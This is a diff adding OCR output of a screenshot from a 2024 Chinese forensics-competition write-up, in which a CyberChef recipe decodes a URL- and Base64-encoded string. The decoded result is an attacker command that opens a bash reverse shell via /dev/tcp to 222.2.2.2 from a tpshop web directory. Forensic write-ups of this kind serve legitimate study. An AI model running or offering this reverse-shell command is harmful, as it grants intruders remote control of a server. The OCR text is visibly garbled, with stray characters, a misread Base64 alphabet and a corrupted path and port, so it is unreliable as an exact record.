@@ -1,0 +1,22 @@
+# OCR: 63755c64a0e898182e2bf951e5c41c9b.jpg
+# 来源: ./02-WriteUp/2024/2024-电子取证比武-复盘/63755c64a0e898182e2bf951e5c41c9b.jpg
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 生成: 2026-11-03 15:15
+
+Recipe
+URLDecode FromBase64 Alphabet
+A-Za-20-9+/= Strictmode
+日
+??
+Removenon-alphabet chars
+盲
+Input
++
+口
+田
+Y2QgIi93d3cvd3d3cm9vdC93d3cudHBzaG9wLmNvbS9hcHBsaWNhdGlvbiI7YmFzaCAtaT4mIC9kZXYvdGNwLzIyMi4yLjIuMi8xMDAwMCA%2BJjE7ZWNoby A5ZjdkzDtwd2Q7ZNobyBkZWE3NWFmNzQzMTU%30
+160 Output
+TrRawBytes
+a
+用
+cd"/ww/wwroot/ww.tpshop.com/application";bash-i>&/dev/tcp/222.2.2.2/1eeee>&1;echo9f7dd;pwd;echodea75af74315
